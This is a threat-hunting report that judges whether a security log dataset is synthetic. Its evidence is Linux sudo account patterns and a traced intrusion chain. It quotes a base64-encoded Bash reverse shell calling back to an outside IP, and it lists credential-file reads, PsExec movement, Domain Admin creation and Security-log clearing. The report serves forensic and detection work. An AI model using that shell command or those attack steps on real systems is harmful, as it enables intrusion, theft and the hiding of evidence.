# Threat Hunter — Authenticity Assessment

## Verdict

**Assessment:** Synthetic
**Verdict Confidence:** 76
**Synthetic-Confidence Score:** 66

## Executive Summary

This is a technically strong dataset whose compromise chain, source-native timing, and network pivots are substantially more production-like than its Linux baseline behavior. The decisive synthetic signal is a dataset-wide identity texture: nine unrelated Linux systems share the same small pool of apparent human and service accounts for interactive sudo activity, including 22 TTY-backed sudo commands by `backup` or `svc_app` and 29 commands executed from another account's home directory.

## Evidence For Synthetic

- `[distribution_texture]` Across the nine Linux hosts with sudo telemetry, all 64 interactive sudo commands come from only six identities (`admin`, `backup`, `deploy`, `ops`, `svc_app`, and `ubuntu`). Service-style accounts account for 22 of them (`svc_app`: 12; `backup`: 10), despite each command declaring a pseudo-terminal. Examples include `svc_app : TTY=pts/3` running `iptables -L -n -v` on `APP-INT-01` at `2024-03-18T12:16:44.855756Z`, `backup : TTY=pts/0` running `ss -ltnp` on `MAIL-CLIN-01` at `2024-03-18T12:15:52.456720Z`, and `svc_app : TTY=pts/5` running `service mysql status` on `DB-PROD-01` at `2024-03-18T12:14:23.861750Z`. This looks like a shared command-and-identity pool applied across host roles rather than organic account use.
- `[environment_or_collection_plausibility]` Of those 64 sudo commands, 29 occur from a different account's home directory. Concrete examples include `backup` in `/home/deploy` on `WS-LNGUYEN-01` at `12:23:41.540166Z`, `svc_app` in `/home/admin` on that host at `14:48:09.440524Z`, `backup` in `/home/admin` on `MAIL-CLIN-01` at `12:15:52.456720Z`, and `svc_app` in `/home/deploy` on `DB-PROD-01` at `12:43:35.628440Z`. Occasional shared-directory use is plausible; this repeated cross-account home traversal across workstations, mail systems, application servers, a database, proxy, and public web server is not convincing as normal enterprise texture.
- `[distribution_texture]` The same compact maintenance-command vocabulary recurs across those unrelated systems: `ss -ltnp` appears four times, `iostat -xz 1 3` four times, `find /etc/systemd/system -maxdepth 2 -type l` four times, and several other commands recur two or three times in only six hours. Repetition by itself can be automation, but these are recorded as varied users on interactive TTYs and combined with randomized-looking working directories, which makes the pattern materially less plausible.
- `[weak_signal]` The explicit interactive reverse-shell process on `WEB-EXT-01` is unusually short-lived. `/bin/bash` PID `581487` executes `bash -c 'echo YmFzaCAtYyAiYmFzaCAtaSA+JiAvZGV2L3RjcC80NS4zMy4zMi4zMC84NDQzIDA+JjEi | base64 -d | bash'` at `2024-03-18T13:20:29.837Z`; Zeek UID `CKGVr8GGSALPUbNlrN` opens `10.10.3.10:37455 -> 45.33.32.30:8443` at `13:20:30.754035Z` for only `3.847106` seconds, and the process terminates at `13:20:36.598Z`. A short automated callback is possible, so this is supporting evidence only.

## Evidence For Real

- The collection has credible scale for a six-hour window: 24,370 eCAR records, 13,589 Windows Security events, 4,063 Sysmon events, 11,385 Zeek connection records, 11,725 ASA records, 1,611 proxy requests, and 864 public-web requests. The attack is surrounded by substantial authentication, process, DNS, SMB, web, proxy, firewall, DHCP, SMTP, TLS, certificate, and scanner noise.
- The web compromise pivot is source-native and temporally coherent. `WEB-EXT-01` creates the encoded Bash process at `13:20:29.837Z`; Zeek records the callback at `13:20:30.754035Z`; the ASA builds connection `1238871` at `13:20:30` and tears it down at `13:20:34`; eCAR records process termination at `13:20:36.598Z`.
- Later lateral movement has realistic endpoint artifacts. On `DC-01`, Sysmon records creation of `C:\Windows\PSEXESVC.exe` at `16:00:16.014Z`, Windows Security records service `PSEXESVC`, eCAR creates the service process at `16:00:17.723Z`, and its child executes `cmd.exe /c whoami && hostname` at `16:00:18.710Z`.
- The Windows Security log-clear behavior is particularly convincing. After `wevtutil cl Security` at `17:42:14.740Z`, the DC Security stream progresses through EventRecordID `28262000`, emits event 1102 at `17:42:15.6063384Z` with EventRecordID `1`, then continues with IDs `2`, `4`, and `5`. That reset is exactly the kind of source-native lifecycle detail that is easy to get wrong.
- Network accounting is nuanced rather than merely matched. The large TLS upload in Zeek UID `C4hpwtSjV9wiTFw0uog` carries `315283040` originator bytes over `3.801881` seconds with `215952` originator packets and `107975` response packets, consistent with a high-throughput upload and ACK traffic. Surrounding connections to the same TLS endpoint include resumed and non-resumed sessions and stable certificate identities.

## Detailed Analysis

The visible environment contains 18 endpoint/server directories spanning Windows workstations, Linux workstations, a domain controller, file server, mail systems, application and database tiers, a public web server, and an explicit proxy. Network visibility is split between core and DMZ Zeek sensors, perimeter ASA telemetry, and two Snort sensors. The window runs approximately `2024-03-18T12:00:01Z` through `17:59:59Z`.

The principal compromise trail is huntable. At `13:20:29.837Z`, Apache (`/usr/sbin/apache2`, PID `23965`) on `WEB-EXT-01` spawns the encoded Bash reverse shell as `www-data`. The associated callback to `45.33.32.30:8443` is present in eCAR, Zeek, and ASA with compatible open/close times and byte counts. Subsequent discovery includes `ip addr show`, `cat /etc/hosts`, `cat /etc/resolv.conf`, `find /opt/ehr -name *credential* -maxdepth 3`, `nmap -sn 10.10.2.0/24`, and a targeted TCP scan. A later root session reads `/var/www/html/config.php` and `/root/.ssh/id_rsa`.

Windows lateral movement and privilege operations are also mechanically coherent. `DC-01` receives PsExec activity from `10.10.1.35`; the dropped service binary, service registration, service process, and child command appear in Security, Sysmon, and eCAR. At `16:15:08.106Z`, a WMI-hosted command creates domain user `svc_mhsync`; at `16:15:11.029Z`, a second command adds it to `Domain Admins`. At `16:20:24.884Z`, the same WMI parent creates `DeviceSyncSvc`, followed by an hourly scheduled task. The service executable runs at `16:28:59.294Z`. Later actions stage `cache_7f3a.zip` from file-server shares, dump and compress database content, make a large outbound TLS transfer, clear the DC Security log, and delete `svc_mhsync` at `17:50:21.831Z`.

I found no impossible actor-before-process relationship in the eCAR data: where a referenced process was visibly created and terminated in-window, child, module, file, and flow activity stayed within that lifecycle. Zeek file `local_orig` values also agreed with their referenced connection UIDs. These checks weigh strongly toward realism and are why the dataset does not score in the confidently-synthetic 81-100 band.

The baseline identity model outweighs those strengths. Interactive Linux administration is spread across the same six generic identities on nine machines. More importantly, `backup` and `svc_app` repeatedly behave like roaming human operators, complete with `pts/*` terminals and current directories under other accounts' homes. The pattern is broad, measurable, and independent of the malicious storyline, so it is a genuine authenticity indicator rather than a complaint that the intrusion is easy to narrate.

## Synthetic Indicator Summary

| Category | Affected source family | Scope | Impact |
|---|---|---|---|
| `distribution_texture` | Linux syslog/sudo | 64 sudo commands across 9 hosts; 22 by `backup`/`svc_app` | Strong generator-like reuse of identities and maintenance vocabulary across unrelated roles |
| `environment_or_collection_plausibility` | Linux syslog/sudo | 29/64 commands run from another identity's `/home` directory | Repeated cross-account working-directory behavior is implausible at dataset scale |
| `distribution_texture` | Linux syslog/sudo | Small command pool repeated two to four times in six hours | Reinforces templated baseline behavior when combined with interactive TTYs and interchangeable accounts |
| `weak_signal` | Linux eCAR, Zeek DMZ, ASA | One reverse-shell callback | Explicit interactive shell lasts only 3.847 seconds; possible, but atypically brief |

## Realism Score by Category

- **Field format accuracy:** 8 — Windows XML, Zeek JSON, ASA, proxy, web, syslog, and eCAR fields are generally source-appropriate, with no decisive malformed value found.
- **Temporal patterns:** 8 — Attack and lifecycle ordering is strong, including a credible Security EventRecordID reset after log clearing; Linux admin texture is the main exception.
- **Cross-source correlation:** 9 — Endpoint, Zeek, firewall, proxy, Windows Security, and Sysmon pivots align without an impossible ordering discovered.
- **Behavioral realism:** 6 — The intrusion tradecraft works, but roaming service-style sudo identities and repeated cross-home execution substantially weaken the baseline.
- **Environmental consistency:** 5 — Host roles and network zones are coherent, while the same six Linux operators appearing across nine heterogeneous systems is difficult to reconcile with organic administration.

## Recommendations

- If this were synthetic, give Linux hosts role-specific local and service accounts. Keep `backup` and `svc_app` non-interactive unless a concrete incident requires an interactive session, and reserve TTY-backed sudo activity for named administrators.
- Model shell working directories from session ownership and command intent. Cross-account `/home/<user>` access should be rare and motivated by a visible task, not broadly sampled across identities and machines.
- Expand maintenance behavior from host-role-specific workflows rather than a shared global pool. Database, proxy, mail, workstation, and public-web administration should have measurably different command vocabularies and account distributions.
- For an explicitly interactive reverse shell, either sustain the process/connection long enough to carry follow-on commands or render it as a short staging callback with source-native evidence of the next execution channel.
